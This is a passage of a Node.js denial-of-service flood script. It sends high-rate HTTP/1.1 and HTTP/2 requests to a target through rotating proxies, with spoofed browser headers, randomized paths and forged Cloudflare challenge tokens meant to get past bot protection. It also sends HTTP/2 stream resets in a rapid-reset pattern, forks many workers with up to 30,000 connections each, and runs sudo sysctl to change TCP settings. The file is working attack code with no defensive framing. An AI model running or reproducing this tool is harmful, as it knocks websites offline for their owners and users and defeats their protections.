    const characters = 'abcdefghijklmnopqrstuvwxyz';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    let result = '';
    for (let i = 0; i < length; i++) {
        const randomIndex = Math.floor(Math.random() * characters.length);
        result += characters[randomIndex];
    }
    return result;
}

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function buildRequest() {
    const browserVersion = getRandomInt(120, 133);
    const fwfw = ['Google Chrome', 'Brave', 'Yandex'];
    const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];

    let brandValue;
    if (browserVersion === 129) {
        brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 130) {
        brandValue = `"Not A(Brand";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    }
    else if (browserVersion === 131) {
        brandValue = `"Mozilla/5.0 (Windows NT 10.0";v="99", "${wfwf}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
    }
    else if (browserVersion === 132) {
        brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${wfwf}";v="${browserVersion}"`;
    }
    else if (browserVersion === 133) {
        brandValue = `"${wfwf}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
    }

    const isBrave = wfwf === 'Brave';

    const acceptHeaderValue = getRandomHeader('accept');
    const langValue = getRandomHeader('accept-language');
    const secChUa = `${brandValue}`;
    const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

    const finalUserAgent = mobileModeEnabled ? getMobileUserAgent() : generateRealisticUserAgent();
    const finalPath = advancedBypassEnabled ? advancedPathRandomization(url.pathname) : randomizePath(url.pathname);
    
    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (hcookie || currentRefererValue) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }

    let headers = `${reqmethod} ${finalPath} HTTP/1.1\r\n` +
        `Accept: ${acceptHeaderValue}\r\n` +
        `Accept-Encoding: ${getRandomHeader('accept-encoding')}\r\n` +
        `Accept-Language: ${langValue}\r\n` +
        'Cache-Control: max-age=0\r\n' +
        'Connection: Keep-Alive\r\n' +
        `Host: ${url.hostname}\r\n` +
        'Sec-Fetch-Dest: document\r\n' +
        'Sec-Fetch-Mode: navigate\r\n' +
        'Sec-Fetch-Site: cross-site\r\n' +
        'Sec-Fetch-User: ?1\r\n' +
        'Upgrade-Insecure-Requests: 1\r\n' +
        `User-Agent: ${finalUserAgent}\r\n` +
        `sec-ch-ua: ${secChUa}\r\n` +
        'sec-ch-ua-mobile: ?0\r\n' +
        'sec-ch-ua-platform: "Windows"\r\n' + mysor1;

    if (advancedBypassEnabled) {
        const bypassHeaders = getAdvancedBypassHeaders();
        for (const [key, value] of Object.entries(bypassHeaders)) {
            if (value !== undefined) {
                headers += `${key}: ${value}\r\n`;
            }
        }
    }

    if (hcookie) {
        headers += `Cookie: ${hcookie}\r\n`;
    }

    if (bypassCacheEnabled && !hcookie) {
        const bypassCookie = generateBypassCookies();
        headers += `Cookie: ${bypassCookie}\r\n`;
    }

    if (currentRefererValue) {
        headers += `Referer: ${currentRefererValue}\r\n` + mysor;
    }

    const mmm = Buffer.from(`${headers}`, 'binary');
    return mmm;
}

const http1Payload = Buffer.concat(new Array(1).fill(buildRequest()))

function go() {
    let proxyHost, proxyPort;

    if(customIP) {
        [proxyHost, proxyPort] = customIP.split(':');
    } else {
        const proxyLine = proxy[~~(Math.random() * proxy.length)];
        [proxyHost, proxyPort] = proxyLine.split(':');
    }

    let tlsSocket;

    if (!proxyPort || isNaN(proxyPort)) {
        go()
        return
    }

    const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
        netSocket.once('data', () => {
            tlsSocket = tls.connect({
                socket: netSocket,
                ...createTLSOptions()
            }, () => {
                if (!tlsSocket.alpnProtocol || tlsSocket.alpnProtocol == 'http/1.1') {

                    if (forceHttp == 2) {
                        tlsSocket.end(() => tlsSocket.destroy())
                        return
                    }

                    function doWrite() {
                      sleep(49)
                        tlsSocket.write(http1Payload, (err) => {
                            if (!err) {
                                const finalDelay = advancedBypassEnabled ? timingBasedBypass() : 
                                                  (isFull ? humanizedDelay() : humanizedDelay());

                                setTimeout(() => {
                                  sleep(1)
                                    doWrite()
                                }, finalDelay)
                            } else {
                                tlsSocket.end(() => tlsSocket.destroy())
                            }
                        })
                    }
                    sleep(19)
                    doWrite()

                    tlsSocket.on('error', () => {
                        tlsSocket.end(() => tlsSocket.destroy())
                    })
                    return
                }

                if (forceHttp == 1) {
                    tlsSocket.end(() => tlsSocket.destroy())
                    return
                }

                let streamId = 1
                let data = Buffer.alloc(0)
                let hpack = new HPACK()
                hpack.setTableSize(4096)

                const updateWindow = Buffer.alloc(4)
                updateWindow.writeUInt32BE(custom_update, 0)

                const frames = [
                    Buffer.from(PREFACE, 'binary'),
                    encodeFrame(0, 4, encodeSettings([
                        [1, custom_header],
                        [2, 0],
                        [4, custom_window],
                        [6, custom_table]
                    ])),
                    encodeFrame(0, 8, updateWindow)
                ];

                tlsSocket.on('data', (eventData) => {
                    data = Buffer.concat([data, eventData])

                    while (data.length >= 9) {
                        const frame = decodeFrame(data)
                        if (frame != null) {
                            data = data.subarray(frame.length + 9)
                            if (frame.type == 4 && frame.flags == 0) {
                                tlsSocket.write(encodeFrame(0, 4, "", 1))
                            }
                            if (frame.type == 1 && debugMode) {
                                const status = hpack.decode(frame.payload).find(x => x[0] == ':status')[1]
                                if (!statuses[status])
                                    statuses[status] = 0

                                statuses[status]++
                            }
                            
                    if (frame.type === 1) {
                        const headersDecoded = hpack.decode(frame.payload);
                        const statusHeader = headersDecoded.find(x => x[0] === ':status');
                        if (statusHeader) {
                            const status = parseInt(statusHeader[1]);
                            if ([403, 429, 503].includes(status)) {
                                const code = rstMode === 'internal' ? 0x2 : rstMode === 'calm' ? 0xC : 0x0;
                                const sid = frame.streamId || 1;
                                if (debugMode) {
                                    console.log(`[RST_STREAM] Reset stream ${sid} (status: ${status}) code: 0x${code.toString(16)}`);
                                }
                                tlsSocket.write(encodeRstStream(sid, code));
                            }
                        }
                    }
                    if (Math.random() < 0.15) {
                        const sid = streamId;
                        const err = [0x0, 0xC, 0x2][Math.floor(Math.random() * 3)];
                        tlsSocket.write(encodeRstStream(sid, err));
                    }
    
                            if (frame.type == 7 || frame.type == 5) {
                                if (frame.type == 7) {
                                    if (debugMode) {
                                        if (!statuses["GOAWAY"])
                                            statuses["GOAWAY"] = 0

                                        statuses["GOAWAY"]++
                                    }
                                }
                                tlsSocket.write(encodeRstStream(0, 3, 0));
                                tlsSocket.end(() => tlsSocket.destroy())
                            }

                        } else {
                            break
                        }
                    }
                })

                tlsSocket.write(Buffer.concat(frames))

                function doWrite() {
                    if (tlsSocket.destroyed) {
                        return
                    }
                    const requests = []
                    const customHeadersArray = [];
                    if (customHeaders) {
                        const customHeadersList = customHeaders.split('#');
                        for (const header of customHeadersList) {
                            const [name, value] = header.split(':');
                            if (name && value) {
                                customHeadersArray.push({ [name.trim().toLowerCase()]: value.trim() });
                            }
                        }
                    }
                    let ratelimit;
                    if (randrate !== undefined) {
                        ratelimit = getRandomInt(1, 90);
                    } else {
                        ratelimit = process.argv[6];
                    }
                    for (let i = 0; i < (isFull ? ratelimit : 1); i++) {
                        const browserVersion = getRandomInt(120, 123);

                        const fwfw = ['Google Chrome', 'Brave'];
                        const wfwf = fwfw[Math.floor(Math.random() * fwfw.length)];
                        const ref = ["same-site", "same-origin", "cross-site"];
                        const ref1 = ref[Math.floor(Math.random() * ref.length)];

                        let brandValue;
                        if (browserVersion === 120) {
                            brandValue = `\"Not_A Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        } else if (browserVersion === 121) {
                            brandValue = `\"Not A(Brand\";v=\"99\", \"${wfwf}\";v=\"${browserVersion}\", \"Chromium\";v=\"${browserVersion}\"`;
                        }
                        else if (browserVersion === 122) {
                            brandValue = `\"Chromium\";v=\"${browserVersion}\", \"Not(A:Brand\";v=\"24\", \"${wfwf}\";v=\"${browserVersion}\"`;
                        }
                        else if (browserVersion === 132) {
                            brandValue = `\"${wfwf}\";v=\"${browserVersion}\", \"Not:A-Brand\";v=\"8\", \"Chromium\";v=\"${browserVersion}\"`;
                        }

                        const isBrave = wfwf === 'Brave';

                        const acceptHeaderValue = getRandomHeader('accept');
                        const langValue = getRandomHeader('accept-language');

                        const secGpcValue = isBrave ? "1" : undefined;

                        const secChUaModel = isBrave ? '""' : undefined;
                        const secChUaPlatform = isBrave ? 'Windows' : undefined;
                        const secChUaPlatformVersion = isBrave ? '10.0.0' : undefined;
                        const secChUaMobile = isBrave ? '?0' : undefined;

                        const secChUa = `${brandValue}`;
                        const currentRefererValue = refererValue === 'rand' ? 'https://' + ememmmmmemmeme(6, 6) + ".net" : refererValue;

                        const finalPath = advancedBypassEnabled ? 
                            advancedPathRandomization(url.pathname) + (postdata ? `?${postdata}` : "") : 
                            (query ? handleQuery(query) : randomizePath(url.pathname) + (postdata ? `?${postdata}` : ""));

                        const baseHeaders = {
                            ":method": reqmethod,
                            ":authority": url.hostname,
                            ":scheme": "https",
                            ":path": finalPath,
                        };

                        if (advancedBypassEnabled) {
                            const bypassHeaders = getAdvancedBypassHeaders();
                            Object.assign(baseHeaders, bypassHeaders);
                        }

                        const headers = Object.entries(baseHeaders).concat(Object.entries({
                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
                            ...(reqmethod === "POST" && { "content-length": "0" }),
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `\"Windows\"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": mobileModeEnabled ? getMobileUserAgent() : generateRealisticUserAgent(),
                            "accept": acceptHeaderValue,
                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
                            ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
                            ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
                            ...(secChUaPlatform && { "sec-ch-ua-platform": secChUaPlatform }),
                            ...(secChUaPlatformVersion && { "sec-ch-ua-platform-version": secChUaPlatformVersion }),
                            ...(Math.random() < 0.5 && { "sec-fetch-site": currentRefererValue ? ref1 : "none" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-mode": "navigate" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-user": "?1" }),
                            ...(Math.random() < 0.5 && { "sec-fetch-dest": "document" }),
                            "accept-encoding": getRandomHeader('accept-encoding'),
                            "accept-language": langValue,
                            ...(hcookie && { "cookie": hcookie }),
                            ...(bypassCacheEnabled && !hcookie && { "cookie": generateBypassCookies() }),
                            ...(currentRefererValue && { "referer": currentRefererValue }),
                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                        }).filter(a => a[1] != null));

                        const headers3 = Object.entries(baseHeaders).concat(Object.entries({
                            ...(Math.random() < 0.4 && { "cache-control": "max-age=0" }),
                            ...(reqmethod === "POST" && { "content-length": "0" }),
                            "sec-ch-ua": secChUa,
                            "sec-ch-ua-mobile": "?0",
                            "sec-ch-ua-platform": `\"Windows\"`,
                            "upgrade-insecure-requests": "1",
                            "user-agent": mobileModeEnabled ? getMobileUserAgent() : generateRealisticUserAgent(),
                            "accept": acceptHeaderValue,
                            ...(secGpcValue && { "sec-gpc": secGpcValue }),
                            ...(secChUaMobile && { "sec-ch-ua-mobile": secChUaMobile }),
                            ...(secChUaModel && { "sec-ch-ua-model": secChUaModel }),
                            ...(secChUaPlatform && { "sec-ch-ua-platform": secChUaPlatform }),
                            ...(secChUaPlatformVersion && { "sec-ch-ua-platform-version": secChUaPlatformVersion }),
                            "sec-fetch-site": currentRefererValue ? ref1 : "none",
                            "sec-fetch-mode": "navigate",
                            "sec-fetch-user": "?1",
                            "sec-fetch-dest": "document",
                            "accept-encoding": getRandomHeader('accept-encoding'),
                            "accept-language": langValue,
                            ...(hcookie && { "cookie": hcookie }),
                            ...(bypassCacheEnabled && !hcookie && { "cookie": generateBypassCookies() }),
                            ...(currentRefererValue && { "referer": currentRefererValue }),
                            ...customHeadersArray.reduce((acc, header) => ({ ...acc, ...header }), {})
                        }).filter(a => a[1] != null));

                        const headers2 = Object.entries({
                            ...(Math.random() < 0.3 && { [`x-client-session${getRandomChar()}`]: `none${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-ms-gec-version${getRandomChar()}`]: `undefined${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`sec-fetch-users${getRandomChar()}`]: `?0${getRandomChar()}` }),
                            ...(Math.random() < 0.3 && { [`x-request-data${getRandomChar()}`]: `dynamic${getRandomChar()}` }),
                        }).filter(a => a[1] != null);

                        for (let i = headers2.length - 1; i > 0; i--) {
                            const j = Math.floor(Math.random() * (i + 1));
                            [headers2[i], headers2[j]] = [headers2[j], headers2[i]];
                        }

                        const combinedHeaders = useLegitHeaders ? headers3.concat() : headers.concat(headers2);

                        function handleQuery(query) {
                            if (query === '1') {
                                return randomizePath(url.pathname) + '?__cf_chl_rt_tk=' + randstrr(41) + '_' + randstrr(12) + '-' + timestampString + '-0-' + 'gaNy' + randstrr(8);
                            } else if (query === '2') {
                                return randomizePath(url.pathname) + '?' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else if (query === '3') {
                                return randomizePath(url.pathname) + '?q=' + generateRandomString(6, 7) + '&' + generateRandomString(6, 7);
                            } else {
                                return randomizePath(url.pathname);
                            }
                        }

                        const packed = Buffer.concat([
                            Buffer.from([0x80, 0, 0, 0, 0xFF]),
                            hpack.encode(combinedHeaders)
                        ]);

                        requests.push(encodeFrame(streamId, 1, packed, 0x25));
                        streamId += 2
                    }

                    tlsSocket.write(Buffer.concat(requests), (err) => {
                        if (!err) {
                            const finalDelay = advancedBypassEnabled ? timingBasedBypass() : 
                                              (isFull ? humanizedDelay() : humanizedDelay());

                            setTimeout(() => {
                                doWrite()
                            }, finalDelay)
                        }
                    })
                }

                doWrite()
            }).on('error', () => {
                tlsSocket.destroy()
            })
        })

        netSocket.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`)
    }).once('error', () => { }).once('close', () => {
        if (tlsSocket) {
            tlsSocket.end(() => { tlsSocket.destroy(); go() })
        }
    })
}

function TCP_CHANGES_SERVER() {
    const congestionControlOptions = ['cubic', 'reno', 'bbr', 'dctcp', 'hybla'];
    const sackOptions = ['1', '0'];
    const windowScalingOptions = ['1', '0'];
    const timestampsOptions = ['1', '0'];
    const selectiveAckOptions = ['1', '0'];
    const tcpFastOpenOptions = ['3', '2', '1', '0'];

    const congestionControl = congestionControlOptions[Math.floor(Math.random() * congestionControlOptions.length)];
    const sack = sackOptions[Math.floor(Math.random() * sackOptions.length)];
    const windowScaling = windowScalingOptions[Math.floor(Math.random() * windowScalingOptions.length)];
    const timestamps = timestampsOptions[Math.floor(Math.random() * timestampsOptions.length)];
    const selectiveAck = selectiveAckOptions[Math.floor(Math.random() * selectiveAckOptions.length)];
    const tcpFastOpen = tcpFastOpenOptions[Math.floor(Math.random() * tcpFastOpenOptions.length)];

    const command = `sudo sysctl -w net.ipv4.tcp_congestion_control=${congestionControl} \
net.ipv4.tcp_sack=${sack} \
net.ipv4.tcp_window_scaling=${windowScaling} \
net.ipv4.tcp_timestamps=${timestamps} \
net.ipv4.tcp_sack=${selectiveAck} \
net.ipv4.tcp_fastopen=${tcpFastOpen}`;

    exec(command, () => { });
}

setInterval(() => {
    timer++;
}, 1000);

setInterval(() => {
    if (timer <= 10) {
        custom_header = custom_header + 1;
        custom_window = custom_window + 1;
        custom_table = custom_table + 1;
        custom_update = custom_update + 1;
    } else {
        custom_table = 65536;
        custom_window = 6291456;
        custom_header = 262144;
        custom_update = 15663105;
        timer = 0;
    }
}, 10000);

if (cluster.isMaster) {

    const workers = {}

    Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
    console.log(`Attacks Sent`);

    cluster.on('exit', (worker) => {
        cluster.fork({ core: worker.id % os.cpus().length });
    });

    cluster.on('message', (worker, message) => {
        workers[worker.id] = [worker, message]
    })
    if (debugMode) {
        setInterval(() => {

            let statuses = {}
            for (let w in workers) {
                if (workers[w][0].state == 'online') {
                    for (let st of workers[w][1]) {
                        for (let code in st) {
                            if (statuses[code] == null)
                                statuses[code] = 0

                            statuses[code] += st[code]
                        }
                    }
                }
            }
            console.clear()
            console.log(new Date().toLocaleString('us'), statuses)
        }, 1000)
    }

    setInterval(TCP_CHANGES_SERVER, 5000);
    setTimeout(() => process.exit(1), time * 1000);

} else {
    let conns = 0

    let i = setInterval(() => {
        if (conns < 30000) {
            conns++

        } else {
            clearInterval(i)
            return
        }
        go()
    }, delay);

    if (debugMode) {
        setInterval(() => {
            if (statusesQ.length >= 4)
                statusesQ.shift()

            statusesQ.push(statuses)
            statuses = {}
            process.send(statusesQ)
        }, 250)
    }

    setTimeout(() => process.exit(1), time * 1000);
}
setInterval(() => {
  if (timer <= 10) {
    updateDynamicSettings();
  } else {
    custom_table = 65535;
    custom_window = 6291456;
    custom_header = 262144;
    custom_update = 15663105;
    timer = 0;
  }
}, 10000);